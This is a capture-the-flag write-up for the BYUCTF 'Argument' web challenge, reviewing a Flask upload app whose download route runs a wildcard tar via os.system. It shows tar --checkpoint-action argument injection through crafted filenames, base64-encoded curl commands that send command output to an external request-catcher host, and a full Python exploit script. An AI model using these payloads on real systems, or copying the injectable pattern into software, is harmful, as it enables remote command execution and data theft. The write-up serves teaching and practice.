# Argument

## Description

The website is rather simple. It is composed of a unique page which is an upload form :

![image](/assets/img/byuctf24/front.png)

It allows you to upload any files without any restriction. Once you've uploaded one or more file, you can download them and the application returns the uploaded files in a `.tar` archive.

The files are stored in **`/upload/<uuid>/<filename>`** where `<uuid>` acts as a sort of session identifier.

The sources of the app are provided so let's dig a bit further in the underlying code.

## Code review

Here is the source of the app :

```python
# imports
from flask import Flask, g, render_template, request, redirect, make_response, send_file, after_this_request
import uuid, os


# initialize flask
app = Flask(__name__)


# ensure each user has a uuid session
@app.before_request
def check_uuid():
    uuid_cookie = request.cookies.get('uuid', None)

    # ensure user has uuid_cookie
    if uuid_cookie is None:
        response = make_response(redirect('/'))
        response.set_cookie('uuid', str(uuid.uuid4()))
        return response
    
    # ensure uuid_cookie is valid UUID
    try:
        uuid.UUID(uuid_cookie)
    except ValueError:
        response = make_response(redirect('/'))
        response.set_cookie('uuid', str(uuid.uuid4()))
        return response
    
    g.uuid = uuid_cookie

    if not os.path.exists(f'uploads/{g.uuid}'):
        os.mkdir(f'uploads/{g.uuid}')


# main dashboard
@app.route('/', methods=['GET'])
def main():
    return render_template('index.html', files=os.listdir(f'uploads/{g.uuid}'))
    

# upload file
@app.route('/api/upload', methods=['POST'])
def upload():
    file = request.files.get('file', None)
    if file is None:
        return 'No file provided', 400
    
    # check for path traversal
    if '..' in file.filename or '/' in file.filename:
        return 'Invalid file name', 400
    
    # check file size
    if len(file.read()) > 1000:
        return 'File too large', 400
    
    file.save(f'uploads/{g.uuid}/{file.filename}')
    return 'Success! <script>setTimeout(function() {window.location="/"}, 3000)</script>', 200


# download file
@app.route('/api/download', methods=['GET'])
def download():
    @after_this_request
    def remove_file(response):
        os.system(f"rm -rf uploads/{g.uuid}/out.tar")
        return response

    # make a tar of all files
    os.system(f"cd uploads/{g.uuid}/ && tar -cf out.tar *")

    # send tar to user
    return send_file(f"uploads/{g.uuid}/out.tar", as_attachment=True, download_name='download.tar', mimetype='application/octet-stream')



if __name__ == "__main__":
    app.run(host='0.0.0.0', port=1337, threaded=True, debug=True)
```

The application runs on a simple Flask server in Python. With this in mind, it becomes clear why there aren't any particular restrictions on the types of files accepted: without PHP, it won't be possible to execute webshells and other scripts that we might have uploaded.

However, we can see that the `/api/download` functionality uses `os.system` to perform a wildcard `tar` operation :

```python
os.system(f"cd uploads/{g.uuid}/ && tar -cf out.tar *")
```

This takes every files within our upload folder and create a `.tar` archive. tar wildcards is a well-known vector for arbitrary command execution. In fact, it is possible to supply arguments as filename and to execute arbitrary OS commands using the checkpoint arguments :

```txt
      --checkpoint[=NUMBER]
              display progress messages every NUMBERth record (default 10)

       --checkpoint-action=ACTION
              execute ACTION on each checkpoint
```

Looks like we've just found our entry point! Let's see how we can exploit it.

## Exploit

We tried at first to upload a bash script and to see if we could execute it to have a callback.

1. upload a file named `--checkpoint=1`
2. upload a file named `--checkpoint-action=exec sh shell.sh`
3. upload the `shell.sh` script :

```bash
#!/bin/bash

curl -X POST -d 'Hello World!' https://happi.requestcatcher.com/test
```

We upload the various files and and then... TADA!
![image](/assets/img/byuctf24/no-req.png)

Shit, we didn't get any callback, what the hell happened. Had to get back to source code to see what happened.

The challenge creator played a trick on us: the files are actually uploaded without their content as he used `file = request.files.get('file', None)` instead of `file = request.files[file]`. Our `shell.sh` script is therefore empty !

What's left then ? To deal with this, we tried to use bash commands directly in the filename. We try to upload a file with name `--checksec-action=exec=sh curl -X POST -d 'Hello World!' https://happi.requestcatcher.com/test` directly and see if we can get a callback now.

![image](/assets/img/byuctf24/no-req-2.png)

Well, the answer is no :')

If we look at the underlying request, we see that there is actually an issue with the filename.
![image](/assets/img/byuctf24/invalid_filename.png)

By the way, it is not possible to use `/` in the filename, and thus in our payload. It is therefore not possible to use commands such as `cat /flag.txt`. Damn, that will makes things a bit harder.

A simple trick to circumvent this is to base64 encode the payload :
![image](/assets/img/byuctf24/b64-encode-trick.png)

We encode our callback payload :
```bash
curl -X POST -d "$(id)" https://happi.requestcatcher.com/test
```

and this time, we finally get a callback !

![image](/assets/img/byuctf24/callback1.png)

We make a `ls /` to retrieve the name of the flag file and then we make a `cat`.

The flag is **`byuctf{argument_injection_stumped_me_the_most_at_D3FC0N_last_year}`** !

## Exploit code

```python
#!/usr/bin/env python3

from uuid import uuid4
import requests
import base64
import urllib3
urllib3.disable_warnings()

base_url = "https://argument.chal.cyberjousting.com"
# base_url = "http://127.0.0.1:1337"

routes = {
  "home": f"{base_url}/",
  "download": f"{base_url}/api/download",
  "upload": f"{base_url}/api/upload"
}

class Exploit:
  def __init__(self, s):
    self.uuid = uuid4()
    self.s = s
    self.s.verify = False
    self.s.proxies = {'http':'0.0.0.0:8080', 'https':'0.0.0.0:8080'}
    self.routes = routes
    self.s.get(self.routes['home'])


  def download(self):
    return self.s.get(self.routes["download"]).content.decode().strip().replace('\0', '')


  def upload(self, filename, data):
    files = {
      'file': (filename, data, 'application/x-shellscript'),
    }
    try:
      r = self.s.post(self.routes['upload'], files=files)
    except err as e:
      print("Something went wrong", e)


if __name__ == "__main__":
  x = Exploit(requests.session())
  
  cmd = b'ls /'  # filename is: /flag_89bb6db3a579141b2cd5c7d01fedf863
  cmd = b'cat /flag_89bb6db3a579141b2cd5c7d01fedf863'
  payload = b'curl -X POST -d "$('
  payload += cmd
  payload += b')" https://happi.requestcatcher.com/test'

  b64_payload = base64.b64encode(payload).decode().strip()
  exploit = f'echo {b64_payload} | base64 -d | sh'

  x.upload(filename="--checkpoint=1", data="")
  x.upload(filename=f'--checkpoint-action=exec={exploit}', data="")
  x.upload(filename="dummy", data="")
  _ = x.download()

```


Thanks you for reading, i want to extend a huge thank to the CTF organizers for putting together this nice event.
